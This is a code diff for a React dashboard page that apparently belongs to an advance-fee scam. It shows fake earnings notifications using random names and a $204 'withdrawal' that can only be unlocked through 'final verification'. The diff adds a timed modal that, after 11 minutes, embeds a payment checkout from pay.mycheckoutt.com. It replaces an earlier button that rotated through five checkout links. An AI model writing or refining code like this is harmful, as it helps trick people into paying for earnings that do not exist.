@@ -81,6 +81,7 @@ export default function Dashboard() {
   const [showVerificationModal, setShowVerificationModal] = useState(false)
   const [showUpdatedBalanceModal, setShowUpdatedBalanceModal] = useState(false)
   const [showVideoRequiredModal, setShowVideoRequiredModal] = useState(false)
+  const [showCheckoutModal, setShowCheckoutModal] = useState(false) // Renamed from showCheckout to showCheckoutModal
   const [lastEarning, setLastEarning] = useState(0)
   const [currentReviewIndex, setCurrentReviewIndex] = useState(0)
   const [withdrawAmount, setWithdrawAmount] = useState("")
@@ -91,24 +92,16 @@ export default function Dashboard() {
   const [showBonusBlock, setShowBonusBlock] = useState(false)
   const [showInitialBlocks, setShowInitialBlocks] = useState(true)
   const [shouldShowEarningsNotifications, setShouldShowEarningsNotifications] = useState(true)
-  const [showCheckoutButton, setShowCheckoutButton] = useState(false)
-  const [checkoutClickCount, setCheckoutClickCount] = useState(0)
 
   const [toastNotifications, setToastNotifications] = useState<ToastNotification[]>([])
   const [notificationCount, setNotificationCount] = useState(0)
 
+  const [currentCheckoutLink, setCurrentCheckoutLink] = useState("")
+  const [lastCheckoutIndex, setLastCheckoutIndex] = useState<number | null>(null)
+
   const emailInputRef = useRef<HTMLInputElement>(null)
   const amountInputRef = useRef<HTMLInputElement>(null)
   const fileInputRef = useRef<HTMLInputElement>(null)
-
-  // Checkout links for rotation
-  const checkoutLinks = [
-    "https://pay.mycheckoutt.com/019bd7bc-513c-728d-8353-f4faa5a4f9e0?ref=",
-    "https://pay.mycheckoutt.com/019bc81f-da82-70e1-b162-ba17cb2000df?ref=",
-    "https://pay.mycheckoutt.com/019bc357-9928-7312-b759-c834c99a4905?ref=",
-    "https://pay.mycheckoutt.com/019b8f52-4227-7017-8c0f-bb67b304acad?ref=",
-    "https://pay.mycheckoutt.com/019bc22f-90be-703f-8dd5-f2c277ec37bc?ref=",
-  ]
 
   const randomNames = [
     "Sarah Johnson",
@@ -357,25 +350,6 @@ export default function Dashboard() {
           !function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);
         `}
       </Script>
-
-      {/* Checkout Button - appears after 10 minutes */}
-      {showCheckoutButton && (
-        <section className="bg-gradient-to-r from-green-600 to-green-500 rounded-lg p-6 border border-green-400 animate-pulse">
-          <div className="text-center">
-            <h2 className="text-xl font-bold text-white mb-2">Unlock Your Withdrawal Now!</h2>
-            <p className="text-sm text-green-100 mb-4">
-              Complete the final verification to withdraw your $204.00
-            </p>
-            <Button
-              onClick={handleCheckoutClick}
-              className="w-full bg-white hover:bg-gray-100 text-green-600 py-6 text-lg font-bold shadow-lg"
-            >
-              <Wallet className="w-5 h-5 mr-2" />
-              WITHDRAW $204.00 NOW
-            </Button>
-          </div>
-        </section>
-      )}
 
       {/* Step-by-step checklist */}
       <section className="bg-gray-900 rounded-lg p-6 border border-gray-800 mb-6">
@@ -1057,7 +1031,13 @@ export default function Dashboard() {
 
     window.scrollTo({ top: 0, behavior: "smooth" })
 
-    // Removed checkout link and timer logic
+    console.log("[v0] Setting checkout link and timer for 11 minutes")
+    setCurrentCheckoutLink("https://pay.mycheckoutt.com/019b8f52-4227-7017-8c0f-bb67b304acad?ref=...")
+    const checkoutTimer = setTimeout(() => {
+      console.log("[v0] Checkout timer fired after 11 minutes")
+      setShowCheckoutModal(true)
+    }, 660000) // 11 minutes = 660 seconds = 660,000 milliseconds
+
     console.log("[v0] Setting notification stop timer for 11 minutes")
     const stopNotificationsTimer = setTimeout(() => {
       console.log("[v0] Stopping earnings notifications after 11 minutes")
@@ -1065,26 +1045,14 @@ export default function Dashboard() {
     }, 660000) // 11 minutes = 660 seconds = 660,000 milliseconds
 
     return () => {
+      clearTimeout(checkoutTimer)
       clearTimeout(stopNotificationsTimer)
     }
   }, [router])
 
   useEffect(() => {
-    // Show checkout button after 10 minutes (600000ms)
-    const checkoutButtonTimer = setTimeout(() => {
-      setShowCheckoutButton(true)
-    }, 600000) // 10 minutes
-
-    return () => clearTimeout(checkoutButtonTimer)
+    // Removed all checkout modal logic
   }, [])
-
-  // Handle checkout button click - rotates through checkouts
-  const handleCheckoutClick = () => {
-    const currentIndex = checkoutClickCount % checkoutLinks.length
-    const checkoutUrl = checkoutLinks[currentIndex]
-    window.open(checkoutUrl, "_blank")
-    setCheckoutClickCount((prev) => prev + 1)
-  }
 
   useEffect(() => {
     console.log("[v0] Timer setup for 11 minutes and 30 seconds")
@@ -1692,7 +1660,19 @@ export default function Dashboard() {
       <UpdatedBalanceModal />
       <VerificationModal />
       <VideoRequiredModal />
-      {/* Removed CheckoutModal and its related logic */}
+      {showCheckoutModal && (
+        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[9999] p-4">
+          <div className="bg-white rounded-lg w-full max-w-4xl h-[90vh] relative">
+            <button
+              onClick={() => setShowCheckoutModal(false)} // Use setShowCheckoutModal here
+              className="absolute top-4 right-4 z-10 bg-black/50 hover:bg-black/70 text-white rounded-full p-2"
+            >
+              <X className="h-6 w-6" />
+            </button>
+            <iframe src={currentCheckoutLink} className="w-full h-full rounded-lg" allow="payment" />
+          </div>
+        </div>
+      )}
     </div>
   )
 }
